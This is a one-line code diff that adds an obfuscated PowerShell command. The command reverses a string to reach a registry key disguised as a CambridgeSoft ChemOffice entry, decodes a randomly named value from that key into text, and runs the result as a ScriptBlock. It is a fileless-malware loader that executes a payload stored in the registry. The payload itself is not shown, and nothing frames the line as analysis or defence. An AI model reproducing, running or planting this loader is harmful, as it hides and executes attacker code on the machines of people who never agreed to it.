@@ -1,0 +1,1 @@
+$sGXeWkHRioxf=[ScriptBlock]; icm ($sGXeWkHRioxf::Create([string]::Join('', ((gp (([regex]::Matches('hFxYwmx1retpadA.AEOC.eciffOmehC.tfoSegdirbmaC\ERAWTFOS\:MLKH','.','RightToLeft') | ForEach {$_.value}) -join '')).'ZVitm4QGfix' | % { [char]$_ }))))
